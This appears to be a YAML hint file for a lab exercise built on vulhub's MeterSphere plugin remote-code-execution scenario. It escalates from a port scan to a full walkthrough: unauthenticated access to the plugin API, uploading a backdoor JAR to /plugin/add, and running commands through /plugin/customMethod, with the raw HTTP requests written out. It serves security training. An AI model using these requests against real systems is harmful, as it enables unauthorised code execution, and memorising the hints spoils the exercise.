schema_version: 1
match: metersphere/plugin-rce
hint_levels:
  low:
  - Inspect the metersphere service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 5005,8081. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 5005,8081 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 8081/tcp → container 8081/tcp; web: 5005/tcp → container
    5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8081`, `http://{{NODE_IP}}:8081/plugin/list`.'
  high:
  - 'Vulnerability: MeterSphere Plugin Endpoint Remote Code Execution.'
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    Exploit

    Firstly, by visiting `http://{{NODE_IP}}:8081/plugin/list`, you can see that the success message is returned without being redirected to the login page, indicating that the plugin API can be accessed without authorization.

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/1.png

    Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0>.

    Upload the evil jar plugin to `/plugin/add` interface:

    ```
    POST /plugin/add HTTP/1.1
    Host: {{NODE_IP}}:8081
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en-US;q=0.9,en;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
    Connection: close
    Cache-Control: max-age=0
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd

    ------WebKitFormBoundaryJV2KX1EL5qmKWXsd
    Content-Disposition: form-data; name="file"; filename="Evil.jar"

    [Paste your jar file]
    ------WebKitFormBoundaryJV2KX1EL5qmKWXsd--

    ```

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/2.png

    > **Take care of bytes encoding by yourself if you use Burpsuite to send the package.**

    Althrough there is an error message is respond, the JAR package path is already added into URL classloader which means we can exploit it.

    Use following request to execute arbitrary command:

    ```
    POST /plugin/customMethod HTTP/1.1
    Host: {{NODE_IP}}:8081
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en-US;q=0.9,en;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
    Connection: close
    Cache-Control: max-age=0
    Content-Type: application/json

    {
      "entry": "org.vulhub.Evil",
      "request": "id"
    }
    ```

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/3.png
